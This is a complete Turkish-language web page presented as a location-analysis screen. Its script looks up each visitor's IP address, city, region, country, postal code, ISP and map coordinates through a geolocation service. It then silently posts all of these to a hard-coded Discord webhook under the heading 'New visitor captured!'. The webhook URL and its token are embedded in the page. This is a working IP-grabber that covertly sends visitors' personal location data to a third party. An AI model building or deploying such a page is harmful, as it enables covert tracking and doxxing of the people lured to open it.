<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Konum Alınıyor...</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Inter', sans-serif;
      background-color: #0e0e10;
      color: #ffffff;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
      text-align: center;
    }

    h1 {
      font-size: 2rem;
      margin-bottom: 1rem;
      animation: fadeIn 1.5s ease;
    }

    .loader {
      border: 6px solid #222;
      border-top: 6px solid #00bfff;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    .info-box {
      background-color: #1c1c1f;
      padding: 20px;
      border-radius: 10px;
      margin-top: 10px;
      max-width: 400px;
      word-wrap: break-word;
      opacity: 0;
      transition: opacity 0.4s ease;
    }

    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-10px);}
      to { opacity: 1; transform: translateY(0);}
    }
  </style>
</head>
<body>
  <div class="loader"></div>
  <h1>Konum verilerin analiz ediliyor...</h1>
  <div class="info-box" id="info"></div>

  <script>
    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(data => {
        const { ip, city, region, country_name, country_code, postal, org, latitude, longitude } = data;

        const infoBox = document.getElementById('info');
        infoBox.innerHTML = `
          🌍 IP: <strong>${ip}</strong><br>
          🏙️ Şehir: <strong>${city}</strong><br>
          🏞️ Bölge: <strong>${region}</strong><br>
          🗺️ Ülke: <strong>${country_name}</strong><br>
          📮 Posta Kodu: <strong>${postal}</strong><br>
          ☁️ ISS: <strong>${org}</strong><br>
        `;
        infoBox.style.opacity = 1;

        const webhookURL = 'https://discord.com/api/webhooks/1396279953896636526/2EBRWqSeo04I0_-1P9QjGbFrpE37IZ3ShrztrEgpN7t8Q6D8M4_EH3rfNzwpsE0LIKIo';

        const message = {
          content: `📡 Yeni ziyaretçi yakalandı!

🛰️ IP: \`${ip}\`
🌆 Şehir: **${city}**
📍 Bölge: **${region}**
🌍 Ülke: **${country_name}** :flag_${country_code.toLowerCase()}:
📮 Posta Kodu: ${postal}
📡 Sağlayıcı: ${org}
🗺️ Harita: https://www.google.com/maps?q=${latitude},${longitude}`
        };

        fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(message)
        });
      })
      .catch(err => {
        document.getElementById('info').innerText = 'Konum bilgisi alınamadı.';
        console.error(err);
      });
  </script>
</body>
</html>
